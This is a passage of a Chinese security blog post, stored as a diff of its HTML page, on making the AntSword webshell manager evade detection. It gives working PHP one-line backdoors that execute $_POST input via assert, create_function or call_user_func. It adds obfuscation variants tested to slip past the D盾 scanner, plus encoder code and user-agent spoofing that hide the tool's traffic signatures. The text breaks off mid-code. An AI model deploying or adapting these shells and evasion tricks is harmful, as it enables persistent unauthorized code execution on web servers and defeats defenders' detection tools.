@@ -1,0 +1,378 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>关于蚁剑免杀学习 | 藏青&#39;s BLOG</title>
+
+  
+  <meta name="author" content="藏青">
+  
+
+  
+  <meta name="description" content="知行合一">
+  
+
+  
+  <meta name="keywords" content="渗透 内网 代码审计">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="关于蚁剑免杀学习"/>
+
+  <meta property="og:site_name" content="藏青&#39;s BLOG"/>
+
+  
+  <meta property="og:image" content="/favicon.ico"/>
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="藏青&#39;s BLOG" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">藏青&#39;s BLOG</a>
+    </h1>
+    <p class="site-description"></p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+        <li><a href="/">Home</a></li>
+      
+        <li><a href="/archives">Archives</a></li>
+      
+        <li><a href="/categories">Categories</a></li>
+      
+        <li><a href="/links">Links</a></li>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>关于蚁剑免杀学习</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2020/09/02/关于蚁剑免杀的学习/" rel="bookmark">
+        <time class="entry-date published" datetime="2020-09-02T12:15:47.000Z">
+          2020-09-02
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当我们直接使用蚁剑这种比较出名的shell管理工具，在一些防护比较严的情况下，可能过一会会就被发现甚至关站，因此去除蚁剑的特征或者对shell免杀都是特别重要的，我之前并未接触过这方面的知识，写这篇文章的目的就是记录自己学习的一个过程，所以开始吧。</span><br></pre></td></tr></table></figure>
+
+<p>我认为特征处理有几个部分吧，一个是静态代码特征，比如我们直接使用蚁剑的马，这种马如果我们没有进行过任何处理直接上传就非常有可能在上传的时候被干掉，也就是说如果在上传的时候就被干掉了，或者上传之后被干掉了，问题都出在传的马被杀了。还有一种情况就是我们的马传上去了，而且也能访问到，然后使用蚁剑连接的时候发现连接被阻断同时马被杀了，这个就是流量方面的特征的问题了。</p>
+<span id="more"></span>
+
+<h3 id="自带shell分析"><a href="#自带shell分析" class="headerlink" title="自带shell分析"></a>自带shell分析</h3><h4 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h4><p>这里首先以php为例，因为其语法变化最为灵活，也是相对来说比较容易做处理的，首先我们看下自带的马是什么样子的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$ant=base64_decode(&quot;YXNzZXJ0&quot;);</span><br><span class="line">$ant($_POST[&#x27;ant&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这个代码非常容易理解，就是将assert关键字进行base64编码，但是我使用assert这个shell会有一个问题，就是蚁剑连不上，通过抓包分析， 在蚁剑连接的时候会发送一个数据包。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727103950002.png" alt="image-20200727103950002"></p>
+<p>因为发送这个数据后返回为空，所以蚁剑显示连接不上，但是我这里将这串数据改成phpinfo()也是可以正常执行的，也就是说这里并不是因为assert不能正常执行命令的问题。我们将这串代码解码后看看,</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;, &quot;0&quot;);</span><br><span class="line">@set_time_limit(0);</span><br><span class="line"></span><br><span class="line">function asenc($out) &#123;</span><br><span class="line">    return $out;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">function asoutput() &#123;</span><br><span class="line">    $output = ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    echo &quot;97a7a&quot;;</span><br><span class="line">    echo @asenc($output);</span><br><span class="line">    echo &quot;777a7fdcd7c&quot;;</span><br><span class="line">&#125;</span><br><span class="line">ob_start();</span><br><span class="line">try &#123;</span><br><span class="line">    $D = dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">    if ($D == &quot;&quot;) $D = dirname($_SERVER[&quot;PATH_TRANSLATED&quot;]);</span><br><span class="line">    $R = &quot;&#123;$D&#125;	&quot;;</span><br><span class="line">    if (substr($D, 0, 1) != &quot;/&quot;) &#123;</span><br><span class="line">        foreach(range(&quot;C&quot;, &quot;Z&quot;) as $L) if (is_dir(&quot;&#123;$L&#125;:&quot;)) $R. = &quot;&#123;$L&#125;:&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $R. = &quot;/&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $R. = &quot;	&quot;;</span><br><span class="line">    $u = (function_exists(&quot;posix_getegid&quot;)) ? @posix_getpwuid(@posix_geteuid()) : &quot;&quot;;</span><br><span class="line">    $s = ($u) ? $u[&quot;name&quot;] : @get_current_user();</span><br><span class="line">    $R. = php_uname();</span><br><span class="line">    $R. = &quot;	&#123;$s&#125;&quot;;</span><br><span class="line">    echo $R;;</span><br><span class="line">&#125; catch (Exception $e) &#123;</span><br><span class="line">    echo &quot;ERROR://&quot;.$e - &gt; getMessage();</span><br><span class="line">&#125;;</span><br><span class="line">asoutput();</span><br><span class="line">die();</span><br></pre></td></tr></table></figure>
+
+<p>大致的意思会输出一些内容  随机字符串+环境变量+随机字符串，如果用eval代替assert是完全没问题的，我查了下资料，assert是不能执行多个语句的，eval可以，所以这里使用assert会有返回为空的问题。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727114425121.png" alt="image-20200727114425121"></p>
+<p>这个问题可以使用base64编码的问题解决，编码后的数据包如下，可以看到ant这个参数传入的是一句话，因此就可以通过assert执行成功。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727114808620.png" alt="image-20200727114808620"></p>
+<p>这里就是蚁剑使用assert的shell的一个坑，<strong>如果使用assert不要使用默认编码。</strong></p>
+<h4 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h4><p>这种方式是通过create_function创建匿名函数来执行命令的，shell的内容如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$ant=create_function(&quot;&quot;, base64_decode(&#x27;QGV2YWwoJF9QT1NUWyJhbnQiXSk7&#x27;));</span><br><span class="line">$ant();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="php-custom-script-for-mysql"><a href="#php-custom-script-for-mysql" class="headerlink" title="php_custom_script_for_mysql"></a>php_custom_script_for_mysql</h4><p>使用这种方式的shell，需要在连接类型上选择custom，否则会连接不上。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727131327779.png" alt="image-20200727131327779"></p>
+<p>使用这种模式我们需要上传的代码是比较长的，大概13k左右。好处就是在数据包中没有明显的eval这样命令执行的名字出现，因为作者已经在custom的代码中进行了实现。比如我们要测试连接。我拿create_funcion和custom的数据包进行对比，内容如下：</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727132341964.png" alt="image-20200727132341964"></p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727132412642.png" alt="image-20200727132412642"></p>
+<p>为什么A就可以返回内容，我们大概分析下代码。</p>
+<p>首先获取$pwd也就是我们的密码的参数值，调用EC字符串编解码的函数进行处理</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727132702622.png" alt="image-20200727132702622"></p>
+<p>根据pwd的值的不同调用不同的函数做对应的操作</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727132825291.png" alt="image-20200727132825291"></p>
+<p>我们在看下BaseInfo()函数具体执行的操作，这里的代码和我们使用其他模式发送的数据是一样的，就是获取服务端的基本信息进行输出，</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727132906141.png" alt="image-20200727132906141"></p>
+<p>custom模式我们大概了解了，再看下一个shell。</p>
+<h4 id="php-eval-rsa-script"><a href="#php-eval-rsa-script" class="headerlink" title="php_eval_rsa_script"></a>php_eval_rsa_script</h4><p>使用这个shell的条件是需要开启openssl的，而且我测试php5.4.45没成功，在php5.3.29下是可以的。</p>
+<p>在phpinfo中查看是否开启了openssl</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727143928992.png" alt="image-20200727143928992"></p>
+<p>开启了openssl后，我们找到蚁剑的编码管理功能，有个rsa配置的功能。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727144031550.png" alt="image-20200727144031550"></p>
+<p>打开后内容如下，主要分为三个部分，RSA的公钥，私钥和php代码。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727144108286.png" alt="image-20200727144108286"></p>
+<p>我们将生成的php代码传到服务端，因为这里获取数据是通过公钥解密的，所以我们需要使用私钥对我们传递的数据进行加密，因此需要创建一个编码器。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727144333763.png" alt="image-20200727144333763"></p>
+<p>创建好编码器后，我们在连接的时候选择我们创建的rsa编码器即可</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727144450235.png" alt="image-20200727144450235"></p>
+<p>使用rsa加密后数据包的内容如下：</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727144526707.png" alt="image-20200727144526707"></p>
+<h3 id="静态免杀"><a href="#静态免杀" class="headerlink" title="静态免杀"></a>静态免杀</h3><p>首先，抛开custom类型的shell，我们发现其他的shell本质上都是构造了一个命令执行的点，所以我们只要构建一个命令执行的点就可以了。</p>
+<p>我这里以D盾来测试shell的静态免杀，我将蚁剑自带的assert那个马扔上去d盾会爆已知后门，然后我尝试将里面的关键字进行更改，已经无法造成一个命令执行的功能了，D盾还是会爆已知后门，也就是说D盾这里检测应该是进行了某些关键字的匹配的。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727150401374.png" alt="image-20200727150401374"></p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727150414729.png" alt="image-20200727150414729"></p>
+<p>我将第二行的内容删掉，D盾还是会爆二级，也就是说如果我们想要静态免杀完全过D盾，不能直接使用变量名做函数名这种方式。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727150635040.png" alt="image-20200727150635040"></p>
+<p>而且这里和是否接收参数也无关，都会爆的。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727150819212.png" alt="image-20200727150819212"></p>
+<p>我发现D盾在这里进行拦截时是会去匹配括号是否闭合的，那我们就可以测试，当我假如复杂的括号时，能否绕过这个规则。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727155255367.png" alt="image-20200727155255367"></p>
+<p>这样虽然可以达到绕过的目的，但是也不符合php的语法。所以我想将括号里的内容注释掉，不过加了注释后又会被拦截。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727162618952.png" alt="image-20200727162618952"></p>
+<p>我尝试在这些括号的两边加上单双引号，也是无法绕过的，我看网上之前有人加了反引号进行绕过，可能是版本更新了吧，我通过那种方式无法绕过，好吧，我承认这个点我绕不过去了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果没有思路了，那就是自己的知识受限了，因此我去看了看其他人的文章</span><br></pre></td></tr></table></figure>
+
+<p>有篇文章也是用了变量函数，但是并没有被拦截。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727170037503.png" alt="image-20200727170037503"></p>
+<p>所以D盾的拦截可变变量的规则是在$xx()在行首的时候，然后我试了试使用上面那种方式的shell，这个仍然还可以免杀。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$a=&quot;assert&quot;;</span><br><span class="line">$b=array(&#x27;&#x27;=&gt;$a($_POST[&#x27;ant&#x27;]));</span><br><span class="line">var_dump($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727171248076.png" alt="image-20200727171248076"></p>
+<p>但是能不能免杀并不是我们的重点，因为是学习嘛，所以得知道为什么他就能免杀了。一方面是上面我分析的绕过了变量函数的检测，我再测试了下，当我们不使用可变变量的形式而是直接assert调用的话是会被拦的。所以就使用了两个技术</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.变量函数的检测绕过</span><br><span class="line">2.通过变量函数来将函数关键字和函数调用部分分开了，破坏了类似于assert()这样的拦截规则。</span><br></pre></td></tr></table></figure>
+
+<p>这个是最主要的绕过的点，如果被其他的杀软拦截了，我们还可以进行各种变形。</p>
+<p><strong>方法一：关键字拆分</strong></p>
+<p>关于assert这个关键字的各种变形</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$a=&#x27;a&#x27;.&#x27;s&#x27;.&#x27;s&#x27;.&#x27;e&#x27;.&#x27;r&#x27;.&#x27;t&#x27;;   //拼接</span><br><span class="line">$a = substr(&#x27;1a&#x27;,1).substr(&#x27;1as&#x27;,2).&#x27;s&#x27;.&#x27;e&#x27;.&#x27;r&#x27;.&#x27;t&#x27;; //拼接+截取</span><br><span class="line">$a = strtr(&#x27;azxcvt&#x27;,&#x27;zxcv&#x27;,&#x27;sser&#x27;);//截取替换</span><br><span class="line">$a = substr_replace(&quot;asxxx&quot;,&quot;sert&quot;,2); //替换</span><br><span class="line">$a=chr(97).chr(115).chr(115).chr(101).chr(114).chr(116);</span><br></pre></td></tr></table></figure>
+
+<p><strong>方法二：改变调用函数</strong></p>
+<p>上面的shell我们是调用assert达到代码执行的目的，那么有没有那个函数可以替换assert这个函数呢。本来以为会有很多函数，查了下发现没有那种可以直接调用的，不过可以通过一些回调函数来解决。我以call_user_func为例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$a=&quot;call_user_func&quot;;</span><br><span class="line">$c=&quot;assert&quot;;</span><br><span class="line">$b=array(&#x27;&#x27;=&gt;$a($c,$_POST[&#x27;ant&#x27;]));</span><br><span class="line">var_dump($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>当然也可以拿其他函数进行变形绕过，这里只是给一个思路。</p>
+<p><strong>方法三：改变array+var_dump</strong></p>
+<p>通过前面的绕过，我们知道这种绕过Dd盾方法的核心在于可变函数的调用方式没有被检测出来，也就是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array(&#x27;&#x27;=&gt;$a($c,$_POST[&#x27;ant&#x27;]));</span><br></pre></td></tr></table></figure>
+
+<p>那么我们在这部分要绕过的点就是有没有哪些调用方式可以放在可变函数的前面，我尝试写个自定义函数来进行绕过，但是使用这种方法不能绕过。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727214520026.png" alt="image-20200727214520026"></p>
+<p>之前我们调用的是var_dump,也可以调用其他方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$a=&quot;assert&quot;;</span><br><span class="line">$b=array(&#x27;&#x27;=&gt;$a($_POST[&#x27;ant&#x27;]));</span><br><span class="line">uksort($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>还可以这样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$a=&quot;assert&quot;;</span><br><span class="line">	$arr = new ArrayObject(array(&#x27;&#x27;=&gt;$a($_POST[&#x27;ant&#x27;])));</span><br><span class="line">	$arr-&gt;uksort();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>好了，关于静态免杀先学到这，其他的方式当然还有很多，我只是挑了一个点而已。</p>
+<h3 id="动态免杀"><a href="#动态免杀" class="headerlink" title="动态免杀"></a>动态免杀</h3><p>上面的操作只是帮我们过了一个shell查杀工具的静态查杀，但是有时候会有这样的情况，就是shell传上去好好的，也没杀，只要一连接就被干掉了，这是为什么呢？这个就涉及到流量方面的免杀了。</p>
+<h4 id="特征去除"><a href="#特征去除" class="headerlink" title="特征去除"></a>特征去除</h4><p>关于蚁剑这款工具，功能很强大，用起来也挺舒服，但是他出名啊，出名的话就会被很多厂商拿去分析，所以我们在使用蚁剑的时候需要去除我们使用蚁剑和服务端进行交互的流量特征，那么都有什么特征呢？</p>
+<h5 id="特征一：user-agent"><a href="#特征一：user-agent" class="headerlink" title="特征一：user-agent"></a>特征一：user-agent</h5><p>​    这个特征是一个非常明显的特征，就和sqlmap的user-agent一样，都是和工具相关的，我们看下：</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728090059610.png" alt="image-20200728090059610"></p>
+<p>这个特征非常明显吧，所以我们使用蚁剑这个特征是一定要改的，我们找到/modules/request.js文件，有个USER_AGENT</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728090412292.png" alt="image-20200728090412292"></p>
+<p>我们将它改成百度的爬虫</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (compatible; Baiduspider-render/2.0;+http://www.baidu.com/search/spider.html)</span><br></pre></td></tr></table></figure>
+
+<p>网上还有人说，需要更改/modules/update.js的请求头，但我看了下这个功能是和github进行交互的，不是和目标交互的流量，所以我认为可以不改吧。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728090753980.png" alt="image-20200728090753980"></p>
+<p>然后重启蚁剑，USER-AGENT内容就已经成功被修改了。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728091048839.png" alt="image-20200728091048839"></p>
+<h5 id="特征二：变量规则"><a href="#特征二：变量规则" class="headerlink" title="特征二：变量规则"></a>特征二：变量规则</h5><p>首先来看下蚁剑的一个数据包，注意看下我圈出来的部分，这里面字符的长度是固定的，在变量那部分，长度是固定的14位，返回包部分前面是9位，后面是7位。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728091745973.png" alt="image-20200728091745973"></p>
+<p>我们新建一个编码器对发送的数据进行处理，编码器里面有个默认的实例，是base64的编码器，就是我们上面图中发送数据使用的编码器，我们学习下是怎么处理的。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728092809554.png" alt="image-20200728092809554"></p>
+<p>作者也非常贴心的把注释写的非常清楚，首先是生成一个14位长度的随机值当作参数名，然后把我们需要传递的内容base64编码进行赋值，然后在pwd中传入代码执行的代码。</p>
+<p>首先看下变量长度的问题如何解决，可以通过随机生成一个长度字段，再去根据长度去随机生成相应的内容，这样就可以确保每次发起请求的参数长度是变化的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">let num =  Math.floor(Math.random()*15);</span><br><span class="line">let randomID = `_0x$&#123;Math.random().toString(16).substr(num)&#125;`;</span><br></pre></td></tr></table></figure>
+
+<p>这样我们发送的参数名的长度就是变化的了。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728102211355.png" alt="image-20200728102211355"></p>
+<p>但是我们仍然有一个核心的问题没有解决，就是在我们发送的流量里面会有eval，这个如何解决呢？</p>
+<h5 id="特征三：eval特征处理"><a href="#特征三：eval特征处理" class="headerlink" title="特征三：eval特征处理"></a>特征三：eval特征处理</h5><p>我参考了蚁剑作者关于这部分处理的文章，他是将eval这部分进行了编码，如果直接对eval进行编码，那在服务端是无法识别这个流量的，因此服务端也需要对这个数据进行base64解码，使用这种方法需要稍微改变一下服务端的代码。</p>
+<p>首先修改一下编码器的代码，将eval部分的代码base64编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data[pwd] = Buffer.from(`eval(base64_decode($_POST[$&#123;randomID&#125;]));`).toString(&#x27;base64&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>然后在修改下我们的shell，让其在接收参数的时候进行base64解码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$a=&quot;assert&quot;;</span><br><span class="line">$c=base64_decode($_POST[&#x27;ant&#x27;]);</span><br><span class="line">$b=array(&#x27;&#x27;=&gt;$a($c));</span><br><span class="line">uksort($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后再抓包看下流量，已经没有eval的特征了</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728104852973.png" alt="image-20200728104852973"></p>
+<p>其实同理，我们既然可以base64,为什么不能hex呢？</p>
+<p>这个我就不讲了，如果理解了base64，那么这个也非常容易</p>
+<p><strong>编码器</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * php::base64编码器</span><br><span class="line"> * Create at: 2020/07/28 10:16:51</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">&#x27;use strict&#x27;;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">* @param  &#123;String&#125; pwd   连接密码</span><br><span class="line">* @param  &#123;Array&#125;  data  编码器处理前的 payload 数组</span><br><span class="line">* @return &#123;Array&#125;  data  编码器处理后的 payload 数组</span><br><span class="line">*/</span><br><span class="line">module.exports = (pwd, data, ext=&#123;&#125;) =&gt; &#123;</span><br><span class="line">  // ##########    请在下方编写你自己的代码   ###################</span><br><span class="line">  // 以下代码为 PHP Base64 样例</span><br><span class="line">  </span><br><span class="line">  // 生成一个随机变量名</span><br><span class="line">  let num =  Math.floor(Math.random()*15);</span><br><span class="line">  let randomID = `_0x$&#123;Math.random().toString(16).substr(num)&#125;`;</span><br><span class="line">  // 原有的 payload 在 data[&#x27;_&#x27;]中</span><br><span class="line">  // 取出来之后，转为 base64 编码并放入 randomID key 下</span><br><span class="line">  data[randomID] = Buffer.from(data[&#x27;_&#x27;]).toString(&#x27;hex&#x27;);</span><br><span class="line"></span><br><span class="line">  // shell 在接收到 payload 后，先处理 pwd 参数下的内容，</span><br><span class="line">  data[pwd] = Buffer.from(`eval(Hex2String($_POST[$&#123;randomID&#125;]));`).toString(&#x27;hex&#x27;);</span><br><span class="line"></span><br><span class="line">  // ##########    请在上方编写你自己的代码   ###################</span><br><span class="line"></span><br><span class="line">  // 删除 